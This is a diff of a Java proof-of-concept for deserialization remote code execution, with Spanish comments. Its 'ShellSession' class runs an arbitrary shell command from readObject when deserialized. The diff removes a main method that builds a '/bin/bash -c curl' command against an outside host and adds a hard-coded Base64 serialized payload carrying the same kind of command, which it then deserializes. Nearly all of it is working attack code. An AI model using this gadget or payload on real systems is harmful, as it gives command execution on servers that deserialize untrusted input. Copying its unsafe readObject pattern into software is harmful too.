@@ -1,7 +1,6 @@
 import java.io.*;
 import java.util.Base64;
 
-
 public class ShellSession implements Serializable {
     private static final long serialVersionUID = 1L;
 
@@ -11,87 +10,47 @@ public class ShellSession implements Serializable {
         this.command = command;
     }
 
-
+    // Ejecuta el comando al deserializar
     private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
         in.defaultReadObject();
-        try {
-            System.out.println("Ejecutando el comando: " + String.join(" ", command));
-            Process process = Runtime.getRuntime().exec(command);
-
-            // Leer e imprimir la salida del comando
-            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
-            String line;
-            while ((line = reader.readLine()) != null) {
-                System.out.println(line);
-            }
-
-            // Leer e imprimir el error del comando (si hay)
-            BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
-            while ((line = errorReader.readLine()) != null) {
-                System.err.println(line);
-            }
-
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
+        Runtime.getRuntime().exec(command);
     }
 
-    // serializar el objeto
-    private void writeObject(ObjectOutputStream out) throws IOException {
-        out.defaultWriteObject();
+    // Serializa el objeto y devuelve el array de bytes
+    public static byte[] serialize(Object obj) throws IOException {
+        ByteArrayOutputStream byteStream = new ByteArrayOutputStream();
+        ObjectOutputStream objectStream = new ObjectOutputStream(byteStream);
+        objectStream.writeObject(obj);
+        objectStream.close();
+        return byteStream.toByteArray();
     }
 
-    public static void main(String[] args) {
-        // Comando a ejecutar como un arreglo de Strings
-        String[] command = {"/bin/bash", "-c", "curl rce.sapo.shk0x.net"};
+    // Deserializa el objeto desde una cadena Base64
+    public static void deserialize(String base64Data) throws IOException, ClassNotFoundException {
+        // Decodificar la cadena Base64 a un array de bytes
+        byte[] data = Base64.getDecoder().decode(base64Data);
 
-        ShellSession exploit = new ShellSession(command);
-
-        System.out.println("Serializando el objeto...");
-        serialize(exploit);
-
-        System.out.println("Deserializando el objeto...");
-        deserialize();
+        // Deserializar el objeto desde el array de bytes
+        ObjectInputStream objectStream = new ObjectInputStream(new ByteArrayInputStream(data));
+        objectStream.readObject();
+        objectStream.close();
     }
 
-    public static void serialize(Object obj) {
-        try {
-            // Crear un ByteArrayOutputStream para serializar el objeto a bytes
-            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
-            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
-            
-            // Serializar el objeto
-            objectOutputStream.writeObject(obj);
-            objectOutputStream.close();
+    public static void main(String[] args) throws IOException, ClassNotFoundException {
+        // Definir comando como array de strings
+        //String[] command = {"/bin/bash", "-c", "curl www.sapo.shk0x.net"};
 
-            // Convertir el objeto serializado a un array de bytes
-            byte[] serializedObjectBytes = byteArrayOutputStream.toByteArray();
+        // Crear el objeto ShellSession con el comando especificado
+        //ShellSession session = new ShellSession(command);
 
-            // Codificar el array de bytes a Base64
-            String base64String = Base64.getEncoder().encodeToString(serializedObjectBytes);
+        // Serializar el objeto y convertirlo a Base64
+        //byte[] serializedData = serialize(session);
+        //String base64String = Base64.getEncoder().encodeToString(serializedData);
+        //System.out.println("Objeto serializado en Base64: " + base64String);
 
-            // Mostrar el objeto serializado en Base64
-            System.out.println("Objeto serializado en Base64: " + base64String);
-
-            // Guardar el objeto serializado en un archivo .ser
-            FileOutputStream fileOutputStream = new FileOutputStream("curl_exploit.ser");
-            fileOutputStream.write(serializedObjectBytes);
-            fileOutputStream.close();
-
-            System.out.println("Objeto serializado correctamente en curl_exploit.ser");
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
-    }
-
-    public static void deserialize() {
-        try {
-            ObjectInputStream is = new ObjectInputStream(new FileInputStream("curl_exploit.ser"));
-            is.readObject();
-            System.out.println("Objeto deserializado correctamente desde curl_exploit.ser");
-            is.close();
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
+        // Deserializar el objeto desde la cadena Base64
+        System.out.println("Deserializando el objeto desde Base64...");
+        String otro = "rO0ABXNyAAxTaGVsbFNlc3Npb24AAAAAAAAAAQIAAVsAB2NvbW1hbmR0ABNbTGphdmEvbGFuZy9TdHJpbmc7eHB1cgATW0xqYXZhLmxhbmcuU3RyaW5nO63SVufpHXtHAgAAeHAAAAADdAAJL2Jpbi9iYXNodAACLWN0ABdjdXJsIHd3dy5zYXBvLnNoazB4Lm5ldA==";
+        deserialize(otro);
     }
 }
